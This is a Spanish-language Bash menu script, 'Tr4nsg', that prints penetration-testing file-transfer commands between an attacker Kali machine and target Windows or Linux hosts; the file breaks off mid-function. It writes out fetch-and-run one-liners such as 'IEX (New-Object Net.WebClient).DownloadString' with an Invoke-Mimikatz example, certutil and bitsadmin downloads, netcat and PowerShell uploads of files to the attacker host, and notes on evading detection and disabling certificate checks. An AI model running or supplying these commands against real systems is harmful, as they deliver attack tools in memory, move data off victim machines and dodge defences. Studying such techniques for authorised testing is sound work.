#!/bin/bash

# Colores para el menú
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Variables globales para los campos comunes
TARGET_IP=""
TARGET_DOMAIN=""
USERNAME=""
PASSWORD=""
LOCAL_FILE=""
REMOTE_FILE=""
PORT=""

# Función para solicitar y validar IP
get_target_ip() {
    while true; do
        echo -n "Ingrese la IP objetivo (ej: 192.168.1.100): "
        read -r TARGET_IP
        if [[ $TARGET_IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
            IFS='.' read -r -a ip_parts <<< "$TARGET_IP"
            valid=true
            for part in "${ip_parts[@]}"; do
                if [ "$part" -gt 255 ] || [ "$part" -lt 0 ]; then
                    valid=false
                    break
                fi
            done
            if [ "$valid" = true ]; then
                break
            fi
        fi
        echo -e "${RED}IP inválida. Por favor, ingrese una IP válida.${NC}"
    done
}

# Función para solicitar y validar dominio
get_target_domain() {
    while true; do
        echo -n "Ingrese el dominio objetivo (ej: ejemplo.com): "
        read -r TARGET_DOMAIN
        if [[ $TARGET_DOMAIN =~ ^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$ ]]; then
            break
        fi
        echo -e "${RED}Dominio inválido. Por favor, ingrese un dominio válido.${NC}"
    done
}

# Función para solicitar credenciales
get_credentials() {
    echo -n "Ingrese el nombre de usuario: "
    read -r USERNAME
    echo -n "Ingrese la contraseña: "
    read -rs PASSWORD
    echo
}

# Función para solicitar archivos
get_files() {
    echo -n "Ingrese la ruta del archivo local: "
    read -r LOCAL_FILE
    echo -n "Ingrese la ruta del archivo remoto: "
    read -r REMOTE_FILE
}

# Función para solicitar puerto
get_port() {
    while true; do
        echo -n "Ingrese el puerto (1-65535): "
        read -r PORT
        if [[ $PORT =~ ^[0-9]+$ ]] && [ "$PORT" -ge 1 ] && [ "$PORT" -le 65535 ]; then
            break
        fi
        echo -e "${RED}Puerto inválido. Por favor, ingrese un puerto válido.${NC}"
    done
}

# Función para solicitar URL
get_url() {
    while true; do
        echo -n "Ingrese la URL (ej: http://ejemplo.com): "
        read -r TARGET_URL
        if [[ $TARGET_URL =~ ^https?://[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}(/.*)?$ ]]; then
            break
        fi
        echo -e "${RED}URL inválida. Por favor, ingrese una URL válida.${NC}"
    done
}

# Función para mostrar el menú principal
show_menu() {
    clear
    echo -e "${BLUE}=== Tr4nsg - Guía de Transferencia de Archivos ===${NC}"
    echo -e "${YELLOW}Seleccione el escenario de transferencia:${NC}"
    echo -e "${GREEN}1.${NC} Kali Linux → Windows"
    echo -e "${GREEN}2.${NC} Windows → Windows"
    echo -e "${GREEN}3.${NC} Kali Linux → Kali Linux"
    echo -e "${GREEN}4.${NC} Windows → Kali Linux"
    echo -e "${GREEN}5.${NC} Salir"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú Kali → Windows
show_kali_to_windows_menu() {
    clear
    echo -e "${BLUE}=== Transferencia desde Kali Linux hacia Windows ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Los comandos se ejecutan en Kali Linux${NC}"
    echo -e "${GREEN}1.${NC} SCP (requiere SSH en Windows)"
    echo -e "${GREEN}2.${NC} Python HTTP Server + PowerShell Download"
    echo -e "${GREEN}3.${NC} Netcat"
    echo -e "${GREEN}4.${NC} FTP"
    echo -e "${GREEN}5.${NC} SMB (usando impacket-smbserver)"
    echo -e "${GREEN}6.${NC} Base64 + PowerShell"
    echo -e "${GREEN}7.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú Windows → Windows
show_windows_to_windows_menu() {
    clear
    echo -e "${BLUE}=== Transferencia entre máquinas Windows ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Los comandos se ejecutan en la máquina Windows destino${NC}"
    echo -e "${GREEN}1.${NC} PowerShell Web Downloads"
    echo -e "${GREEN}2.${NC} SMB Shares"
    echo -e "${GREEN}3.${NC} FTP"
    echo -e "${GREEN}4.${NC} Bitsadmin"
    echo -e "${GREEN}5.${NC} Certutil"
    echo -e "${GREEN}6.${NC} Base64"
    echo -e "${GREEN}7.${NC} PowerShell Fileless"
    echo -e "${GREEN}8.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú Kali → Kali
show_kali_to_kali_menu() {
    clear
    echo -e "${BLUE}=== Transferencia entre máquinas Kali Linux ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Los comandos se ejecutan en la máquina Kali destino${NC}"
    echo -e "${GREEN}1.${NC} SCP"
    echo -e "${GREEN}2.${NC} Netcat"
    echo -e "${GREEN}3.${NC} Python HTTP Server + wget/curl"
    echo -e "${GREEN}4.${NC} FTP"
    echo -e "${GREEN}5.${NC} Base64"
    echo -e "${GREEN}6.${NC} Rsync"
    echo -e "${GREEN}7.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú Windows → Kali
show_windows_to_kali_menu() {
    clear
    echo -e "${BLUE}=== Transferencia desde Windows hacia Kali Linux ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Los comandos se ejecutan en la máquina Windows${NC}"
    echo -e "${GREEN}1.${NC} PowerShell Web Upload"
    echo -e "${GREEN}2.${NC} FTP"
    echo -e "${GREEN}3.${NC} Netcat"
    echo -e "${GREEN}4.${NC} Base64 + Python"
    echo -e "${GREEN}5.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para implementar Kali → Windows con SMB
implement_kali_to_windows_smb() {
    echo -e "${BLUE}=== Transferencia Kali → Windows usando SMB ===${NC}"
    echo -e "${YELLOW}Seleccione el método de transferencia:${NC}"
    echo -e "${GREEN}1.${NC} Servidor SMB básico (acceso de invitado)"
    echo -e "${GREEN}2.${NC} Servidor SMB con usuario y contraseña"
    echo -e "${GREEN}3.${NC} Servidor SMB con múltiples usuarios"
    echo -e "${GREEN}4.${NC} Servidor SMB con permisos específicos"
    echo -e "${GREEN}5.${NC} Servidor SMB con logging"
    echo -e "${GREEN}6.${NC} Servidor SMB con Samba"
    echo -e "${GREEN}7.${NC} Volver al menú anterior"
    echo
    read -p "Seleccione una opción: " smb_option

    case $smb_option in
        1)
            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
            echo "1. Crear un servidor SMB básico:"
            echo "sudo impacket-smbserver share /tmp/smbshare -smb2support"
            echo
            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
            echo "1. Conectarse al share y copiar el archivo:"
            echo "net use \\\\<IP_KALI>\\share /user:guest"
            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
            ;;
        2)
            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
            echo "1. Crear un servidor SMB con autenticación:"
            read -p "Ingrese el nombre de usuario para el share: " smb_user
            read -s -p "Ingrese la contraseña para el share: " smb_pass
            echo
            echo "sudo impacket-smbserver share /tmp/smbshare -smb2support -user $smb_user -password $smb_pass"
            echo
            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
            echo "1. Conectarse al share y copiar el archivo:"
            echo "net use \\\\<IP_KALI>\\share /user:$smb_user $smb_pass"
            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
            ;;
        3)
            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
            echo "1. Crear un servidor SMB con múltiples usuarios:"
            read -p "Ingrese el nombre del primer usuario: " smb_user1
            read -s -p "Ingrese la contraseña del primer usuario: " smb_pass1
            echo
            read -p "Ingrese el nombre del segundo usuario: " smb_user2
            read -s -p "Ingrese la contraseña del segundo usuario: " smb_pass2
            echo
            echo "sudo impacket-smbserver share /tmp/smbshare -smb2support -user $smb_user1 -password $smb_pass1 -user $smb_user2 -password $smb_pass2"
            echo
            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
            echo "1. Conectarse al share y copiar el archivo:"
            echo "net use \\\\<IP_KALI>\\share /user:$smb_user1 $smb_pass1"
            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
            ;;
        4)
            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
            echo "1. Crear un servidor SMB con permisos específicos:"
            read -p "Ingrese el nombre de usuario: " smb_user
            read -s -p "Ingrese la contraseña: " smb_pass
            echo
            read -p "Ingrese los permisos (ej: 777): " smb_perm
            echo "sudo impacket-smbserver share /tmp/smbshare -smb2support -user $smb_user -password $smb_pass -perm $smb_perm"
            echo
            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
            echo "1. Conectarse al share y copiar el archivo:"
            echo "net use \\\\<IP_KALI>\\share /user:$smb_user $smb_pass"
            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
            ;;
        5)
            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
            echo "1. Crear un servidor SMB con logging:"
            read -p "Ingrese el nombre de usuario: " smb_user
            read -s -p "Ingrese la contraseña: " smb_pass
            echo
            echo "sudo impacket-smbserver share /tmp/smbshare -smb2support -user $smb_user -password $smb_pass -debug"
            echo
            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
            echo "1. Conectarse al share y copiar el archivo:"
            echo "net use \\\\<IP_KALI>\\share /user:$smb_user $smb_pass"
            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
            ;;
        6)
            echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
            echo "1. Configurar servidor SMB con Samba:"
            echo "sudo apt-get install samba"
            echo "sudo nano /etc/samba/smb.conf"
            echo "[share]"
            echo "   path = /tmp/smbshare"
            echo "   browseable = yes"
            echo "   read only = no"
            echo "   guest ok = yes"
            echo "sudo service smbd restart"
            echo
            echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
            echo "1. Conectarse al share y copiar el archivo:"
            echo "net use \\\\<IP_KALI>\\share /user:guest"
            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
            ;;
        7)
            return
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            return
            ;;
    esac

    echo
    echo -e "${YELLOW}Seleccione el método de transferencia en Windows:${NC}"
    echo -e "${GREEN}1.${NC} Usando net use (CMD)"
    echo -e "${GREEN}2.${NC} Usando PowerShell"
    echo -e "${GREEN}3.${NC} Usando New-PSDrive"
    echo -e "${GREEN}4.${NC} Usando robocopy"
    echo -e "${GREEN}5.${NC} Usando xcopy"
    echo -e "${GREEN}6.${NC} Usando PowerShell con credenciales explícitas"
    echo -e "${GREEN}7.${NC} Usando PowerShell con autenticación de dominio"
    echo
    read -p "Seleccione una opción: " win_option

    case $win_option in
        1)
            echo -e "${YELLOW}Usando net use (CMD):${NC}"
            echo "net use \\\\<IP_KALI>\\share /user:guest"
            echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
            ;;
        2)
            echo -e "${YELLOW}Usando PowerShell:${NC}"
            echo "Copy-Item -Path '\\\\<IP_KALI>\\share\\archivo.exe' -Destination 'C:\\Windows\\Temp\\archivo.exe'"
            ;;
        3)
            echo -e "${YELLOW}Usando New-PSDrive:${NC}"
            read -p "Ingrese el nombre de usuario: " ps_user
            read -s -p "Ingrese la contraseña: " ps_pass
            echo
            echo '$password = ConvertTo-SecureString "'$ps_pass'" -AsPlainText -Force'
            echo '$cred = New-Object System.Management.Automation.PSCredential("'$ps_user'", $password)'
            echo 'New-PSDrive -Name "S" -PSProvider FileSystem -Root "\\\\<IP_KALI>\\share" -Credential $cred'
            echo 'Copy-Item -Path "S:\\archivo.exe" -Destination "C:\\Windows\\Temp\\archivo.exe"'
            ;;
        4)
            echo -e "${YELLOW}Usando robocopy:${NC}"
            echo "robocopy \\\\<IP_KALI>\\share C:\\Windows\\Temp archivo.exe"
            ;;
        5)
            echo -e "${YELLOW}Usando xcopy:${NC}"
            echo "xcopy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe /Y"
            ;;
        6)
            echo -e "${YELLOW}Usando PowerShell con credenciales explícitas:${NC}"
            read -p "Ingrese el nombre de usuario: " ps_user
            read -s -p "Ingrese la contraseña: " ps_pass
            echo
            echo '$secpasswd = ConvertTo-SecureString "'$ps_pass'" -AsPlainText -Force'
            echo '$mycreds = New-Object System.Management.Automation.PSCredential("'$ps_user'", $secpasswd)'
            echo 'Copy-Item -Path "\\\\<IP_KALI>\\share\\archivo.exe" -Destination "C:\\Windows\\Temp\\archivo.exe" -Credential $mycreds'
            ;;
        7)
            echo -e "${YELLOW}Usando PowerShell con autenticación de dominio:${NC}"
            read -p "Ingrese el nombre del dominio: " ps_domain
            read -p "Ingrese el nombre de usuario: " ps_user
            read -s -p "Ingrese la contraseña: " ps_pass
            echo
            echo '$domain = "'$ps_domain'"'
            echo '$username = "'$ps_user'"'
            echo '$password = ConvertTo-SecureString "'$ps_pass'" -AsPlainText -Force'
            echo '$cred = New-Object System.Management.Automation.PSCredential("$domain\\$username", $password)'
            echo 'Copy-Item -Path "\\\\<IP_KALI>\\share\\archivo.exe" -Destination "C:\\Windows\\Temp\\archivo.exe" -Credential $cred'
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            return
            ;;
    esac

    echo
    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Las nuevas versiones de Windows pueden bloquear el acceso de invitados"
    echo "2. Si el acceso de invitados está bloqueado, usar credenciales"
    echo "3. Para evitar problemas de autenticación:"
    echo "   - Usar credenciales válidas de Windows"
    echo "   - Verificar que el usuario tenga permisos de lectura"
    echo "   - Considerar usar un usuario con privilegios de administrador"
    echo "4. Para problemas de conectividad:"
    echo "   - Verificar que el puerto 445 esté abierto"
    echo "   - Comprobar que el firewall no esté bloqueando SMB"
    echo "   - Asegurarse de que el servicio SMB esté habilitado en Windows"
    echo "5. Para mejorar la seguridad:"
    echo "   - Usar contraseñas fuertes"
    echo "   - Limitar los permisos al mínimo necesario"
    echo "   - Considerar usar SMB con cifrado (SMB 3.0)"
    echo
    echo -e "${YELLOW}Soluciones a problemas comunes:${NC}"
    echo "1. Error de acceso denegado:"
    echo "   - Verificar credenciales"
    echo "   - Comprobar permisos de la carpeta compartida"
    echo "   - Intentar con otro usuario"
    echo "2. Error de red:"
    echo "   - Verificar conectividad entre máquinas"
    echo "   - Comprobar configuración de red"
    echo "   - Verificar que los servicios SMB estén activos"
    echo "3. Error de autenticación:"
    echo "   - Usar credenciales de dominio si es necesario"
    echo "   - Verificar políticas de seguridad de Windows"
    echo "   - Comprobar restricciones de red"
    echo
    echo -e "${YELLOW}Métodos alternativos si SMB está bloqueado:${NC}"
    echo "1. Usar WebDAV:"
    echo "   - Configurar servidor WebDAV en Kali"
    echo "   - Conectar desde Windows usando 'net use' con puerto 80"
    echo
    echo "2. Usar FTP:"
    echo "   - Configurar servidor FTP en Kali"
    echo "   - Usar cliente FTP nativo de Windows"
    echo
    echo "3. Usar HTTP/HTTPS:"
    echo "   - Servidor web en Kali"
    echo "   - PowerShell o certutil en Windows"
    echo
    echo "4. Usar SSH:"
    echo "   - Servidor SSH en Kali"
    echo "   - pscp o scp en Windows"
}

# Función para implementar Kali → Windows con Python + PowerShell
implement_kali_to_windows_python_powershell() {
    echo -e "${BLUE}=== Transferencia Kali → Windows usando Python + PowerShell ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
    echo "1. Crear un servidor HTTP con Python:"
    echo "python3 -m http.server 8000"
    echo
    echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
    echo "1. Usar PowerShell para descargar el archivo:"
    echo "(New-Object Net.WebClient).DownloadFile('http://<IP_KALI>:8000/archivo.exe', 'C:\\Windows\\Temp\\archivo.exe')"
    echo
    echo -e "${YELLOW}Alternativa con Invoke-WebRequest:${NC}"
    echo "Invoke-WebRequest -Uri 'http://<IP_KALI>:8000/archivo.exe' -OutFile 'C:\\Windows\\Temp\\archivo.exe'"
    echo
    echo -e "${YELLOW}Alternativa con certutil:${NC}"
    echo "certutil.exe -urlcache -split -f http://<IP_KALI>:8000/archivo.exe C:\\Windows\\Temp\\archivo.exe"
}

# Función para implementar Windows → Windows con SMB
implement_windows_to_windows_smb() {
    echo -e "${BLUE}=== Transferencia Windows → Windows usando SMB ===${NC}"
    echo -e "${YELLOW}PASO 1: En Windows origen${NC}"
    echo "1. Compartir una carpeta:"
    echo "net share sharename=C:\\shared /grant:everyone,full"
    echo
    echo -e "${YELLOW}PASO 2: En Windows destino${NC}"
    echo "1. Conectarse al share:"
    echo "net use \\\\<IP_WINDOWS>\\sharename /user:username password"
    echo "2. Copiar archivo:"
    echo "copy \\\\<IP_WINDOWS>\\sharename\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
    echo
    echo -e "${YELLOW}Alternativa con PowerShell:${NC}"
    echo "Copy-Item -Path '\\\\<IP_WINDOWS>\\sharename\\archivo.exe' -Destination 'C:\\Windows\\Temp\\archivo.exe'"
}

# Función para implementar Kali → Kali con Netcat
implement_kali_to_kali_netcat() {
    echo -e "${BLUE}=== Transferencia Kali → Kali usando Netcat ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali destino (receptor)${NC}"
    echo "1. Escuchar en un puerto:"
    echo "nc -l -p 1234 > archivo.sh"
    echo
    echo -e "${YELLOW}PASO 2: En Kali origen (emisor)${NC}"
    echo "1. Enviar el archivo:"
    echo "nc <IP_KALI_DESTINO> 1234 < archivo.sh"
    echo
    echo -e "${YELLOW}Alternativa con transferencia encriptada (cryptcat):${NC}"
    echo "En destino: cryptcat -l -p 1234 > archivo.sh"
    echo "En origen: cryptcat <IP_KALI_DESTINO> 1234 < archivo.sh"
}

# Función para implementar Windows → Kali con PowerShell
implement_windows_to_kali_powershell() {
    echo -e "${BLUE}=== Transferencia Windows → Kali usando PowerShell ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali Linux (receptor)${NC}"
    echo "1. Crear un servidor HTTP con Python:"
    echo "python3 -m http.server 8000"
    echo
    echo -e "${YELLOW}PASO 2: En Windows (emisor)${NC}"
    echo "1. Subir archivo usando PowerShell:"
    echo '$filePath = "C:\\Windows\\Temp\\archivo.exe"'
    echo '$url = "http://<IP_KALI>:8000/upload"'
    echo '$form = @{'
    echo '    file = Get-Item -Path $filePath'
    echo '}'
    echo 'Invoke-WebRequest -Uri $url -Method Post -Form $form'
    echo
    echo -e "${YELLOW}Alternativa con WebClient:${NC}"
    echo '$wc = New-Object System.Net.WebClient'
    echo '$wc.UploadFile("http://<IP_KALI>:8000/upload", "C:\\Windows\\Temp\\archivo.exe")'
}

# Función para PowerShell Web Downloads
implement_powershell_web_downloads() {
    echo -e "${BLUE}=== PowerShell Web Downloads ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método debe ejecutarse en la máquina objetivo${NC}"
    echo -e "${YELLOW}Descripción: Descarga archivos desde un servidor web hacia la máquina objetivo${NC}"
    
    get_url
    get_files
    
    echo -e "${YELLOW}Métodos disponibles:${NC}"
    echo "1. DownloadFile"
    echo "2. DownloadFileAsync"
    echo "3. Invoke-WebRequest"
    echo "4. Invoke-WebRequest con User Agent personalizado"
    echo

    echo -e "${GREEN}1. DownloadFile Method:${NC}"
    echo "(New-Object Net.WebClient).DownloadFile('$TARGET_URL', '$REMOTE_FILE')"
    echo

    echo -e "${GREEN}2. DownloadFileAsync Method:${NC}"
    echo "(New-Object Net.WebClient).DownloadFileAsync('$TARGET_URL', '$REMOTE_FILE')"
    echo

    echo -e "${GREEN}3. Invoke-WebRequest Method:${NC}"
    echo "Invoke-WebRequest -Uri '$TARGET_URL' -OutFile '$REMOTE_FILE'"
    echo

    echo -e "${GREEN}4. Invoke-WebRequest con User Agent:${NC}"
    echo "Invoke-WebRequest -Uri '$TARGET_URL' -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile '$REMOTE_FILE'"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Para evitar errores de SSL/TLS:"
    echo "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}"
    echo
    echo "2. Para evitar errores de IE:"
    echo "Invoke-WebRequest -Uri '$TARGET_URL' -OutFile '$REMOTE_FILE' -UseBasicParsing"
    echo
    echo "3. Para simular tráfico legítimo:"
    echo '$wc = New-Object System.Net.WebClient'
    echo '$wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'
    echo '$wc.DownloadFile("$TARGET_URL", "$REMOTE_FILE")'
}

# Función para PowerShell Fileless Downloads
implement_powershell_fileless() {
    echo -e "${BLUE}=== PowerShell Fileless Downloads ===${NC}"
    
    echo -e "${YELLOW}Métodos disponibles:${NC}"
    echo "1. IEX (Invoke-Expression)"
    echo "2. IEX con Pipeline"
    echo

    echo -e "${GREEN}1. IEX Method:${NC}"
    echo "IEX (New-Object Net.WebClient).DownloadString('$TARGET_URL')"
    echo "Ejemplo: IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')"
    echo

    echo -e "${GREEN}2. IEX with Pipeline:${NC}"
    echo "(New-Object Net.WebClient).DownloadString('$TARGET_URL') | IEX"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. El script se ejecuta directamente en memoria"
    echo "2. No se escribe nada en disco"
    echo "3. Útil para evadir detección de archivos"
}

# Función para SMB Transfers
implement_smb_transfers() {
    echo -e "${BLUE}=== SMB Transfers ===${NC}"
    
    get_target_ip
    get_credentials
    get_files
    
    echo -e "${YELLOW}¿Qué es SMB?${NC}"
    echo "El protocolo de bloque de mensajes del servidor (SMB) que se ejecuta en el puerto TCP/445"
    echo "es común en redes empresariales con servicios Windows. Permite transferir archivos"
    echo "desde y hacia servidores remotos."
    echo

    echo -e "${GREEN}1. Configuración del servidor SMB básico:${NC}"
    echo "sudo impacket-smbserver share -smb2support /tmp/smbshare"
    echo

    echo -e "${GREEN}2. Configuración del servidor SMB con autenticación:${NC}"
    echo "sudo impacket-smbserver share -smb2support /tmp/smbshare -user $USERNAME -password $PASSWORD"
    echo

    echo -e "${YELLOW}Métodos de transferencia:${NC}"
    echo -e "${GREEN}1. Copia directa (sin autenticación):${NC}"
    echo "copy \\\\$TARGET_IP\\share\\$LOCAL_FILE $REMOTE_FILE"
    echo
    echo -e "${GREEN}2. Copia con autenticación:${NC}"
    echo "net use n: \\\\$TARGET_IP\\share /user:$USERNAME $PASSWORD"
    echo "copy n:\\$LOCAL_FILE $REMOTE_FILE"
    echo
    echo -e "${GREEN}3. Usando PowerShell:${NC}"
    echo "Copy-Item -Path '\\\\$TARGET_IP\\share\\$LOCAL_FILE' -Destination '$REMOTE_FILE'"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Las nuevas versiones de Windows bloquean el acceso de invitados no autenticados"
    echo "2. Si recibe un error al usar 'copy filename \\IP\\sharename', intente montar primero"
    echo "3. Requiere permisos de administrador en Windows"
    echo "4. Puede ser bloqueado por políticas de seguridad"
    echo "5. Útil para transferencias internas"
}

# Función para Métodos Alternativos
implement_alternative_methods() {
    echo -e "${BLUE}=== Métodos Alternativos de Transferencia ===${NC}"
    
    echo -e "${YELLOW}1. Bitsadmin:${NC}"
    echo "bitsadmin /transfer n http://<IP>/file.exe C:\\Temp\\file.exe"
    echo

    echo -e "${YELLOW}2. Certutil:${NC}"
    echo "certutil.exe -verifyctl -split -f http://<IP>/file.exe"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Bitsadmin es una herramienta legítima de Windows"
    echo "2. Certutil es útil para evadir detección"
    echo "3. Ambos métodos son nativos de Windows"
}

# Función para Wget
implement_wget() {
    echo -e "${BLUE}=== Transferencia con Wget ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método debe ejecutarse en la máquina atacante${NC}"
    echo -e "${YELLOW}Descripción: Descarga archivos desde un servidor web hacia la máquina atacante${NC}"
    
    echo -e "${YELLOW}Descarga básica:${NC}"
    echo "wget https://<URL>/file.sh -O /tmp/file.sh"
    echo

    echo -e "${YELLOW}Descarga con User Agent:${NC}"
    echo "wget --user-agent='Mozilla/5.0' https://<URL>/file.sh -O /tmp/file.sh"
    echo

    echo -e "${YELLOW}Descarga en segundo plano:${NC}"
    echo "wget -b https://<URL>/file.sh -O /tmp/file.sh"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Wget es una herramienta común en Linux"
    echo "2. Permite descargas recursivas"
    echo "3. Soporta múltiples protocolos (HTTP, HTTPS, FTP)"
}

# Función para cURL
implement_curl() {
    echo -e "${BLUE}=== Transferencia con cURL ===${NC}"
    
    echo -e "${YELLOW}Descarga básica:${NC}"
    echo "curl -o /tmp/file.sh https://<URL>/file.sh"
    echo

    echo -e "${YELLOW}Descarga con User Agent:${NC}"
    echo "curl -A 'Mozilla/5.0' -o /tmp/file.sh https://<URL>/file.sh"
    echo

    echo -e "${YELLOW}Subida de archivo:${NC}"
    echo "curl -F 'file=@/path/to/file' https://<URL>/upload"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. cURL es más versátil que wget"
    echo "2. Soporta más protocolos"
    echo "3. Mejor para scripting"
}

# Función para PHP
implement_php() {
    echo -e "${BLUE}=== Transferencia con PHP ===${NC}"
    
    echo -e "${YELLOW}Descarga básica:${NC}"
    echo "php -r '\$file = file_get_contents(\"https://<URL>/file.sh\"); file_put_contents(\"file.sh\",\$file);'"
    echo

    echo -e "${YELLOW}Subida de archivo:${NC}"
    echo "php -r '\$ch = curl_init(); curl_setopt(\$ch, CURLOPT_URL, \"https://<URL>/upload\"); curl_setopt(\$ch, CURLOPT_POST, 1); curl_setopt(\$ch, CURLOPT_POSTFIELDS, [\"file\" => \"@/path/to/file\"]); curl_exec(\$ch);'"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Útil si PHP está disponible"
    echo "2. Puede evadir algunas restricciones"
    echo "3. Soporta múltiples protocolos"
}

# Función para SCP
implement_scp() {
    echo -e "${BLUE}=== Transferencia con SCP ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método debe ejecutarse en la máquina atacante${NC}"
    echo -e "${YELLOW}Descripción: Transfiere archivos desde la máquina atacante hacia la máquina objetivo${NC}"
    
    get_target_ip
    get_credentials
    get_port
    get_files
    
    echo -e "${YELLOW}Subida de archivo:${NC}"
    echo "scp -P $PORT $LOCAL_FILE $USERNAME@$TARGET_IP:$REMOTE_FILE"
    echo

    echo -e "${YELLOW}Descarga de archivo:${NC}"
    echo "scp -P $PORT $USERNAME@$TARGET_IP:$REMOTE_FILE $LOCAL_FILE"
    echo

    echo -e "${YELLOW}Subida de directorio:${NC}"
    echo "scp -r -P $PORT $LOCAL_FILE $USERNAME@$TARGET_IP:$REMOTE_FILE"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere acceso SSH"
    echo "2. Transferencia encriptada"
    echo "3. Útil para transferencias seguras"
}

# Función para Netcat
implement_netcat() {
    echo -e "${BLUE}=== Transferencia con Netcat ===${NC}"
    
    echo -e "${YELLOW}En el servidor (receptor):${NC}"
    echo "nc -l -p 1234 > file.sh"
    echo

    echo -e "${YELLOW}En el cliente (emisor):${NC}"
    echo "nc <IP> 1234 < file.sh"
    echo

    echo -e "${YELLOW}Transferencia encriptada (con cryptcat):${NC}"
    echo "cryptcat -l -p 1234 > file.sh"
    echo "cryptcat <IP> 1234 < file.sh"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Simple pero efectivo"
    echo "2. Útil cuando otros métodos están bloqueados"
    echo "3. Puede ser detectado por firewalls"
}

# Función para Python
implement_python() {
    echo -e "${BLUE}=== Transferencia con Python ===${NC}"
    
    echo -e "${YELLOW}Descarga con requests:${NC}"
    echo "python3 -c 'import requests; r = requests.get(\"$TARGET_URL\"); open(\"$LOCAL_FILE\", \"wb\").write(r.content)'"
    echo

    echo -e "${YELLOW}Servidor HTTP simple (para compartir archivos):${NC}"
    echo "python3 -m http.server 8000"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere el módulo requests instalado"
    echo "2. Útil para scripting y automatización"
    echo "3. El servidor HTTP simple es útil para compartir archivos"
}

# Función para Base64 en Linux
implement_base64() {
    echo -e "${BLUE}=== Transferencia con Base64 en Linux ===${NC}"
    
    echo -e "${YELLOW}Codificar archivo:${NC}"
    echo "base64 file.sh > file.sh.b64"
    echo "cat file.sh | base64 > file.sh.b64"
    echo

    echo -e "${YELLOW}Decodificar archivo:${NC}"
    echo "base64 -d file.sh.b64 > file.sh"
    echo "cat file.sh.b64 | base64 -d > file.sh"
    echo

    echo -e "${YELLOW}Codificar y enviar por pipe:${NC}"
    echo "cat file.sh | base64 | nc -l -p 1234"
    echo "nc <IP> 1234 | base64 -d > file.sh"
    echo

    echo -e "${YELLOW}Codificar y pegar en terminal:${NC}"
    echo "base64 file.sh"
    echo "# Copiar la salida y en el destino:"
    echo "echo 'CONTENIDO_BASE64' | base64 -d > file.sh"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Útil para transferir archivos binarios como texto"
    echo "2. Puede evadir algunas restricciones de firewall"
